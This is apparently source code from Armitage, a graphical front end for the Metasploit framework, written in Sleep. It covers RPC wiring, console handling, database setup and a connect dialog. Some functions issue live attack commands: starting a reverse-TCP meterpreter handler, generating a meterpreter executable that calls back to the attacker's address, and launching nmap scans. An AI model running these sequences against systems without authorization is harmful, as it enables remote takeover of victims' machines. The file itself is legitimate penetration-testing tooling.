#
# Utility Functions for Armitage
#

import console.*;
import armitage.*;
import msf.*;

import javax.swing.*;
import javax.swing.event.*;

import java.awt.*;
import java.awt.event.*;

global('$MY_ADDRESS');

# cmd($client, "console", "command here", &callback);
#    invokes a metasploit command... calls the specified callback with the output when the command is complete.
sub cmd {
	#warn("cmd called: " . @_);
	[new CommandClient: $1, "$3 $+ \n", "console.read", "console.write", $2, $4, 0];
}

sub cmd_all {
	local('$c');
	#warn("cmd_all called: " . @_);
	$c = cast(map({ return "$1 $+ \n"; }, $3), ^String);
	[new CommandClient: $1, $c, "console.read", "console.write", $2, $4, 0];
}

sub cmd_all_async {
	local('$c');
	#warn("cmd_all_async called: " . @_);
	$c = cast(map({ return "$1 $+ \n"; }, $3), ^String);
	[new CommandClient: $1, $c, "console.read", "console.write", $2, $4, 1];
}

# cmd_async($client, "console", "command here", &callback);
#    invokes a metasploit command... calls the specified callback with the output when the command is complete.
#    this function expects that $client is a newly created console (one that will be destroyed on completion)
sub cmd_async {
	#warn("cmd_async called: " . @_);
	[new CommandClient: $1, "$3 $+ \n", "console.read", "console.write", $2, $4, 1];
}

# invokes an RPC call: call($console, "function", arg1, arg2, ...)
sub call {
	local('$exception');

	try {
	        if (size(@_) > 2) {
        	        return convertAll([$1 execute: $2, cast(sublist(@_, 2), ^Object)]);
	        }
        	else {
                	return convertAll([$1 execute: $2]);
	        }
	}
	catch $exception {
		showError("Something went wrong:\nTried:  ". @_ . "\n\nError:\n $+ $exception");
	}
}

# recurses through Java/Sleep data structures and makes sure everything is a Sleep data structure.
sub convertAll {
	if ($1 is $null) {
		return $1;
	}
	else if ($1 isa ^Map) {
		return convertAll(copy([SleepUtils getHashWrapper: $1]));
	}
	else if ($1 isa ^Collection) {
		return convertAll(copy([SleepUtils getArrayWrapper: $1]));
	}
	else if (-isarray $1 || -ishash $1) {
		local('$key $value');

		foreach $key => $value ($1) {
			$value = convertAll($value);
		}
	}

	return $1;
}

# cleans the prompt text from an MSF RPC call
sub cleanText {
        return tr($1, "\x01\x02", "");
}

# creates a new metasploit console (with all the trimmings)
sub createConsolePanel {
	local('$console $result $thread $1');
	$console = [new Console: $preferences];
	$result = call($client, "console.create");
	$thread = [new ConsoleClient: $console, $client, "console.read", "console.write", "console.destroy", $result['id'], $1];
	[$thread setMetasploitConsole];

	[$console addWordClickListener: lambda({
		local('$word');
		$word = [$1 getActionCommand];

		if ($word in @exploits || $word in @auxiliary) {
			[$thread sendString: "use $word $+ \n"];
		}
		else if ($word in @payloads) {
			[$thread sendString: "set PAYLOAD $word $+ \n"];
		}
		else if (-exists $word) {
			saveFile($word);
		}
	}, \$thread)];

	return @($result['id'], $console, $thread);
}

sub createConsoleTab {
	local('$id $console $thread $1 $2');
	($id, $console, $thread) = createConsolePanel($2);
	[$frame addTab: iff($1 is $null, "Console", $1), $console, $thread];
	return $thread;
}

# check for a database, init if there isn't one
sub requireDatabase {
	local('$r');
	$r = call($1, "db.status");
	if ($r['driver'] eq "None" || $r['db'] is $null) {
		thread(lambda({
			yield 8192;
			local('$r');
			$r = call($client, "db.status");
			if ($r['driver'] eq "None" || $r['db'] is $null) {
				call($client, "console.destroy", $console);
				showError("Unable to connect to database.\nMake sure it's running");
				[$retry];
			}
		}, $retry => $5, \$console));

		cmd_all($client, $console, @("db_driver $2", "db_connect $3"), 
			lambda({ 
				if ($3 ne "") { 
					showError($3); 
				} 

				if ("db_connect*" iswm $1 && "*Failed to*" !iswm $3) { 
					[$continue]; 
				} 
			}, $continue => $4)
		);
	}
	else {
		[$4];
	}
}

sub setupHandlers {
	find_job("Exploit: multi/handler", {
		if ($1 == -1) {
			# setup a handler for meterpreter
			cmd_all($client, $console, 
				@("use exploit/multi/handler",
				"set PAYLOAD windows/meterpreter/reverse_tcp",
				"setg LPORT " . randomPort(),
				"set LHOST 0.0.0.0",
				"setg AutoLoadStdapi true",
				"setg AutoSystemInfo true",
				"exploit -j")
			, { });
		}
	});
}

# creates the metasploit console.
sub createConsole {
	local('$r');
	$r = call($1, "console.create");
	if ($r['id'] !is $null) {
		call($1, "console.read", $r['id'] . "");
		return $r['id'] . "";
	}
}

sub getWorkspaces 
{
	return sorta(filter({ return $1["name"]; }, call($client, "db.workspaces")["workspaces"]));
}

sub createNmapFunction
{
	return lambda({
		local('$tmp_console $address');
		$tmp_console = createConsole($client);
		$address = ask("Enter scan range (e.g., 192.168.1.0/24):");
		
		if ($address eq "") { return; }

		cmd_async($client, $tmp_console, "db_nmap $args $address", 
			lambda({ 
				call($client, "console.destroy", $tmp_console);
				$FIXONCE = $null;
				refreshTargets();
				fork({ showError("Scan Complete!\n\nUse Attacks->Find Attacks to suggest\napplicable exploits for your targets."); }, \$frame);
			}, \$tmp_console)
		);
	}, $args => $1);
}

sub getBindAddress {
	cmd($client, $console, "use windows/meterpreter/reverse_tcp", {
		local('$address');
		$address = call($client, "console.tabs", $console, "setg LHOST ")["tabs"];
		#warn("Options are: $address");

		$address = split('\\s+', $address[0])[2];
		
		if ($address eq "127.0.0.1") {
			[SwingUtilities invokeLater: {
				local('$address');
				$address = ask("Could not determine attack computer IP\nWhat is it?");
				if ($address ne "") {
					cmd_all($client, $console, @("back", "setg LHOST $address"), { if ($3 ne "") { setupHandlers(); } });
					$MY_ADDRESS = $address;
				}
			}];
		}
		else {
			cmd_all($client, $console, @("back", "setg LHOST $address"), { if ($3 ne "") { setupHandlers(); } });
		}

		$MY_ADDRESS = $address;
	});
}

sub randomPort {
	return int( 1024 + (rand() * 1024 * 30) );
}

sub meterpreterPayload {
	local('$port $tmp_console');
	$port = randomPort();

	$tmp_console = createConsole($client);
	cmd_all_async($client, $tmp_console, @(
		"use windows/meterpreter/reverse_tcp",
		"set LHOST $MY_ADDRESS",
		"generate -t exe -f $1",
		"back"), lambda({ 
			if ($1 eq "back\n") {
				call($client, "console.destroy", $tmp_console); 
			}
			invoke($f, @_); 
		}, $f => $2, \$tmp_console));
}

sub scanner {
	return lambda({
		launch_dialog("Scan ( $+ $type $+ )", "auxiliary", "scanner/ $+ $type", $host);
	}, $sid => $2, $host => $3, $type => $1);
}

sub connectDialog {

	# in case we ended up back here... let's kill this handle
	if ($msfrpc_handle) {
		closef($msfrpc_handle);
		$msfrpc_handle = $null;
	}

	local('$dialog $host $port $ssl $user $pass $driver $connect $button $cancel $start $center $helper');
	$dialog = window("Connect...", 0, 0);
	
	# setup our nifty form fields..

	$host = [new JTextField: [$preferences getProperty: "connect.host.string", "127.0.0.1"], 20];
	$port = [new JTextField: [$preferences getProperty: "connect.port.string", "55553"], 10];
	
	$ssl = [new JCheckBox: "Use SSL"];
	if ([$preferences getProperty: "connect.ssl.boolean", ""] ne "") {
		[$ssl setSelected: 1];
	}

	$user = [new JTextField: [$preferences getProperty: "connect.user.string", "msf"], 20];
	$pass = [new JTextField: [$preferences getProperty: "connect.pass.string", "test"], 20];

	$driver = select(@("sqlite3", "postgresql", "mysql"), [$preferences getProperty: "connect.db_driver.string", "sqlite3"]);
	$connect = [new JTextField: [$preferences getProperty: "connect.db_connect.string", 'armitage.db.' . ticks()], 16];

	$helper = [new JButton: "?"];
	[$helper addActionListener: lambda({
		local('$dialog $user $pass $host $db $action $cancel $u $p $h $d');
		$dialog = dialog("DB Connect String Helper", 300, 200);
		[$dialog setLayout: [new GridLayout: 5, 1]];

		if ([$connect getText] ismatch '(.*?):"(.*?)"@(.*?)/(.*?)') {
			($u, $p, $h, $d) = matched();
		}
		else {
			($u, $p, $h, $d) = @("user", "password", "127.0.0.1", "armitagedb");
		}

		$user = [new JTextField: $u, 20];
		$pass = [new JTextField: $p, 20];
		$host = [new JTextField: $h, 20];
		$db   = [new JTextField: $d, 20];

		$action = [new JButton: "Set"];
		$cancel = [new JButton: "Cancel"];

		[$action addActionListener: lambda({
			[$connect setText: [$user getText] . ':"' . 
					[$pass getText] . '"@' . 
					[$host getText] . '/' . 
					[$db getText]
			];
			[$dialog setVisible: 0];
		}, \$user, \$pass, \$host, \$db, \$dialog, \$connect)];

		[$cancel addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];

		[$dialog add: label_for("DB User", 75, $user)];
		[$dialog add: label_for("DB Pass", 75, $pass)];
		[$dialog add: label_for("DB Host", 75, $host)];
		[$dialog add: label_for("DB Name", 75, $db)];
		[$dialog add: center($action, $cancel)];
		[$dialog pack];

		[$dialog setVisible: 1];
	}, \$connect)];

	$button = [new JButton: "Connect"];
	$start  = [new JButton: "Start MSF"];
	$cancel = [new JButton: "Exit"];

	# lay them out

	$center = [new JPanel];
	[$center setLayout: [new GridLayout: 7, 1]];

	[$center add: label_for("Host", 130, $host)];
	[$center add: label_for("Port", 130, $port)];
	[$center add: $ssl];
	[$center add: label_for("User", 130, $user)];
	[$center add: label_for("Pass", 130, $pass)];
	[$center add: label_for("DB Driver", 130, $driver)];
	[$center add: label_for("DB Connect String", 130, $connect, $helper)];

	[$dialog add: $center, [BorderLayout CENTER]];
	[$dialog add: center($button, $start, $cancel), [BorderLayout SOUTH]];

	[$button addActionListener: lambda({
		[$dialog setVisible: 0];
		connectToMetasploit([$host getText], [$port getText], [$ssl isSelected], [$user getText], [$pass getText], [$driver getSelectedItem], [$connect getText], 1);
	}, \$dialog, \$host, \$port, \$ssl, \$user, \$pass, \$driver, \$connect)];

	[$start addActionListener: lambda({
		local('$pass $exception');
		$pass = unpack("H*", digest(ticks() . rand(), "MD5"))[0];
		try {
			# check for MSF on Windows
			if (isWindows()) {
				$msfrpc_handle = exec("ruby msfrpcd -f -U msf -P $pass -t Basic -S", convertAll([System getenv]));
			}
			else {
				$msfrpc_handle = exec("msfrpcd -f -U msf -P $pass -t Basic -S", convertAll([System getenv]));
			}

			# consume bytes so msfrpcd doesn't block when the output buffer is filled
			fork({
				while (1) {
					if (available($msfrpc_handle) > 0) {
						readb($msfrpc_handle, available($msfrpc_handle));
					}
					sleep(2048);
				}	
			}, \$msfrpc_handle);

			[$dialog setVisible: 0];
			connectToMetasploit('127.0.0.1', "55553", 0, "msf", $pass, [$driver getSelectedItem], [$connect getText], 1);
		}
		catch $exception {
			showError("Couldn't launch MSF\n" . [$exception getMessage]);
		}
	}, \$connect, \$driver, \$dialog)];

	[$cancel addActionListener: {
		[System exit: 0];
	}];

	[$dialog pack];
	[$dialog setLocationRelativeTo: $null];
	[$dialog setVisible: 1];
}
